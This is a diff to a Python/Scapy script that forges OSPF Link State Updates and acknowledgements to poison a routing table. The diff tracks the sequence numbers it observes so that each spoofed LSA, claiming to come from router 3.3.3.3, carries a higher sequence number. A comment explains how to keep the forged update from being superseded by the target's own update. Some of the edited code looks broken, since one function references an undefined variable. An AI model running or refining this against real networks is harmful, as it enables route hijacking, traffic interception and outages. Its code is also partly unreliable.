@@ -7,6 +7,7 @@ import threading
 state = "INIT"
 poison_time = 0
 last_lsupd_time = 0
+lsa_seq_r = 0x80000001
 
 # Function to process received packets based on the ospf handshake state
 def handle_packet(packet):
@@ -14,6 +15,7 @@ def handle_packet(packet):
     global state
     global poison_time
     global last_lsupd_time
+    global lsa_seq_r
     
     if packet.haslayer(OSPF_Hdr):
         ospf_layer = packet.getlayer(OSPF_Hdr)
@@ -67,6 +69,7 @@ def handle_packet(packet):
         
         # If in "DBD_SENT" or "REQ_SENT" state, handle the LS Update and Ack packet
         elif state == "UPDATE_2_SENT" or state == "UPDATE_SENT" and ospf_layer.type == 4:
+            lsa_seq_r = packet[OSPF_LSA_Hdr].seq
             print("Received OSPF LS Update packet after Router Update sent")
             # send_ls_r_upd_upd_update(packet)
             send_ls_n_update()
@@ -355,9 +358,12 @@ def send_ls_r_upd_update(received_packet):
 
 def send_ls_r_upd_upd_update(received_packet):
     
+    global lsa_seq_r
+    
     lsa = received_packet[OSPF_Router_LSA]
     lsa_seq = lsa.seq
     lsa_age = lsa.age
+    lsa_seq_r = lsa_seq
     
     linklist = []
     for link in lsa.linklist:
@@ -450,18 +456,19 @@ def send_ls_ack_target():
 
 def send_ls_ack_target_2():
     
-    #lsa = received_packet[OSPF_LSA_Hdr]
-    #lsa_seq = lsa.seq
-    #lsa_age = lsa.age
+    lsa = received_packet[OSPF_LSA_Hdr]
+    lsa_seq = lsa.seq
+    lsa_age = lsa.age
     
     ospf_ack = OSPF_LSAck(
         lsaheaders=[
         OSPF_LSA_Hdr(
             type = 1,
+            age = lsa_age,
             options=0x22,
             id="1.1.1.1",  # Network ID, copying pcap
             adrouter="1.1.1.1",  # Their router ID
-            seq=0x80000099  # Sequence number (increment if re-sending)
+            seq=lsa_seq  # Sequence number (increment if re-sending)
             )
         ]
     )
@@ -480,6 +487,8 @@ def send_ls_ack_target_2():
 
 def send_ls_ack_all():
     
+    global lsa_seq_r
+    
     #lsa = received_packet[OSPF_LSA_Hdr]
     #lsa_seq = lsa.seq
     #lsa_age = lsa.age
@@ -491,7 +500,7 @@ def send_ls_ack_all():
             options=0x22,
             id="1.1.1.1",  # Network ID, copying pcap
             adrouter="1.1.1.1",  # Their router ID
-            seq=0x80000099  # Sequence number (increment if re-sending)
+            seq=lsa_seq_r  # Sequence number (increment if re-sending)
             )
         ]
     )
@@ -510,6 +519,8 @@ def send_ls_ack_all():
 
 
 def send_poison_packet(received_packet):
+
+    global lsa_seq_r
     
     ospf_update = OSPF_LSUpd(
         lsacount=1, # Number of LSAs in this update
@@ -517,7 +528,7 @@ def send_poison_packet(received_packet):
         age=0,
         id="3.3.3.3", 
         adrouter="3.3.3.3", 
-        seq=0x8000009A,
+        seq=lsa_seq_r + 1,
         options=0x22, # 0x22 is Demand Circuits, External Routing
         linklist=[
         OSPF_Link(type=2, id="10.0.0.0", data="255.255.255.0", metric=1),
@@ -572,4 +583,4 @@ while True:
 # all variable names must be correct (lsa_header, linklist, adrouter)
 # ospf LLS TLV defined by OSPF_LLS_Hdr
 # seq must not be incremented in LSUpd unless there is a change in link-states
-# age must not be greater than 1 or else our Upd will be superseded by an LSUpd from target
+# age must not be greater than 1 or else our Upd will be superseded by an LSUpd from target
